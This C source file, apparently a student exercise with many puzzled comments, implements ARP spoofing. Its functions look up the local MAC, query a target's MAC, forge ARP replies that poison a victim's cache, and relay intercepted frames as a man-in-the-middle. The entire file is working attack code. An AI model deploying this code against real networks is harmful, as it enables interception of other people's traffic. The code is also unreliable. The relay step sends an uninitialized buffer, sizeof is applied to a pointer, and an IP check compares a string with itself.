#include "header.h"

void get_mymac(char *my_mac)
{
	struct ifreq ifr;		//in <net/if.h>
	struct ifconf ifc;		//	""
	char buf[1024];			//what buf, why 1024
		
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);	//AF_INET, SOCK_DGRAM, socket in <net/if.h> and IPPROTO_IP in <netinet/in.h>
	if(sock == -1) {/*Do what*/}  

	ifc.ifc_len = sizeof(buf);	//why 1024?
	ifc.ifc_buf = buf;
	if(ioctl(sock, SIOCGIFCONF, &ifc) == -1)
	{
		//error?
	}

	struct ifreq* it = ifc.ifc_req;		//ifc_req is ifreq pointer?
	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));	// what is this??? I think this is for eterator

	int success = 0;
	for (; it != end; it++)
	{
		strcpy(ifr.ifr_name, it->ifr_name);
		if(ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) // success -> return 0?
			//need <sys/ioctl.h>
		{
			if( !(ifr.ifr_flags & IFF_LOOPBACK))
			{
		
				if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
				{
					//what is SIOCGIFHWADDR, return 0 is success?
					success =1;
					break;
				}
			}
		}	
		else { /*error*/ }
	}
	if(success)
		memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
}

void request(unsigned char *my_mac, char *my_ip, unsigned char *target_mac, char *target_ip)
{
	printf("Getting MAC Address....\n");
	int i;
	ether_h ethernet;
	for(i = 0; i < 6; i++)
	{
		ethernet.src[i] = my_mac[i];
		ethernet.dst[i] = 0xff;
	}
	ethernet.type = htons(0x0806);		//modify need

	arp_h arp;
	arp.hard_type = htons(1); //ethernet
	arp.proto_type = htons(0x0800); //ip
	arp.hard_length = 6;
	arp.proto_length = 4;
	arp.opcode = htons(1);			
	for(i = 0; i < 6; i++)
	{
		arp.hard_src[i] = my_mac[i];
		arp.hard_dst[i] = 0x00;
	}
	inet_pton(AF_INET, my_ip, &arp.proto_src);		//in <arpa/inet.h>	my_ip?
	inet_pton(AF_INET, target_ip, &arp.proto_dst);		//

	unsigned char *send_packet = (unsigned char*)malloc(sizeof(ethernet)+sizeof(arp));
	memset(send_packet, 0, sizeof(ethernet)+sizeof(arp));
	
	memcpy(send_packet, &ethernet, sizeof(ethernet));
	memcpy(send_packet+sizeof(ethernet), &arp, sizeof(arp));

	char errbuf[256];			//size other presentation
	char *dev = pcap_lookupdev(errbuf);	//errbuf size?
	pcap_t *handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);	//length why 65536

	if( pcap_sendpacket(handle, send_packet, sizeof(ethernet)+sizeof(arp)) != 0)
	{
		printf("Can't send the packet!\n");
		return;			//handle to replay
	}

	const unsigned char *packet;
	int is_ok;
	ether_h *ether_cover;
	arp_h *arp_cover;
	struct pcap_pkthdr *header;

	while(1)
	{
		is_ok = pcap_next_ex(handle, &header, &packet);
		if( is_ok == 0 )
		{
			printf("No packet\n");
			continue;
		}
		else if( is_ok == -1)
		{
			printf("Interface Down\n");
			break;
		}
		ether_cover = (ether_h*)packet;
		if(ntohs(ether_cover->type) == 0x0806)
		{
			arp_cover = (arp_h*)(packet+14);
			if(ntohs(arp_cover->opcode) == 2)
			{
				inet_ntop(AF_INET, arp_cover->proto_src, (char*)target_ip, sizeof(target_ip));		//20 is ok?
				printf("%s\n", target_ip);
				if(!strncmp((const char*)target_ip, target_ip, strlen(target_ip)))
				{
					printf("OK! ");	
					for(i = 0; i < 6; i++)
					{
						target_mac[i] = arp_cover->hard_src[i];
					}
					break;
				}
				else
					printf("IP Incorrect\n");
			}
			else
				printf("Not reply\n");
		}
		else
			printf("Not ARP\n");
	}
	printf("Success Getting %s's MAC\n\n", target_ip);
}

void poisoning(unsigned char *my_mac, char *target_ip, unsigned char *sender_mac, char *sender_ip)
{
	printf("Try poisoning...\n");
	char errbuf[256];
	char *dev = pcap_lookupdev(errbuf);
	pcap_t *handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);

	unsigned char *send_packet = (unsigned char*)malloc(sizeof(ether_h)+sizeof(arp_h));
	int i;
	ether_h ethernet;
	for(i = 0; i < 6; i++)
	{
		ethernet.src[i] = my_mac[i];
		ethernet.dst[i] = 0xff;
	}
	ethernet.type = htons(0x0806);		//modify need

	arp_h arp;
	arp.hard_type = htons(1); //ethernet
	arp.proto_type = htons(0x0800); //ip
	arp.hard_length = 6;
	arp.proto_length = 4;
	arp.opcode = htons(1);			
	for(i = 0; i < 6; i++)
	{
		arp.hard_src[i] = my_mac[i];
		arp.hard_dst[i] = 0x00;
	}
	inet_pton(AF_INET, target_ip, &arp.proto_src);		//in <arpa/inet.h>	my_ip?
	inet_pton(AF_INET, sender_ip, &arp.proto_dst);		//

	memset(send_packet, 0, sizeof(ether_h)+sizeof(arp));
	
	for(i = 0; i < 6; i++)
	{
		ethernet.dst[i] = sender_mac[i];
		arp.hard_dst[i] = sender_mac[i];
	}
	arp.opcode = htons(2);

	memcpy(send_packet, &ethernet, sizeof(ether_h));
	memcpy(send_packet + sizeof(ether_h), &arp, sizeof(arp_h));
	
	while(pcap_sendpacket(handle, send_packet, sizeof(ether_h)+sizeof(arp_h)) != 0)
	{
		printf("Can't send the packet!\n");
		return;
	}
	printf("Success Poisonning!\n\n");
}

void relay(unsigned char *my_mac, unsigned char *target_mac)
{
	char errbuf[256];			//size other presentation
	char *dev = pcap_lookupdev(errbuf);	//errbuf size?
	pcap_t *handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);	//length
	struct pcap_pkthdr *header;
	const unsigned char *packet;
	unsigned char *send_packet;
					//why 65536
	int is_ok, i;	
	char *relay;
	ether_h *relay_ether = (ether_h*)malloc(sizeof(ether_h));
	while(1)
	{
		is_ok = pcap_next_ex(handle, &header, &packet);
		if( is_ok == 0 )
		{
			printf("No packet\n");
			continue;
		}
		else if( is_ok == -1)
		{
			printf("Interface Down\n");
			break;
		}
		relay = (char*)malloc(header->len);
		memcpy(relay, packet, header->len);
		memcpy(relay_ether, relay, sizeof(ether_h));
		printf("Copied Successfully!\n");
		for( i = 0; i < 6; i++)
		{
			relay_ether->src[i] = my_mac[i];
			relay_ether->dst[i] = target_mac[i];
		}

		for( i = 0; i < 6; i++)
			printf(":%x", relay_ether->src[i]);
		printf("\n");
		for( i = 0; i < 6; i++)
			printf(":%x", relay_ether->dst[i]);
		if(pcap_sendpacket(handle, send_packet, header->len) != 0)
		{
			printf("%s\n", pcap_geterr(handle));
		}
		else
		{
			for (int k = 0; k < 6; k++)
				printf("%x:", relay_ether->dst[k]);
		}
	}
	free(send_packet);
}
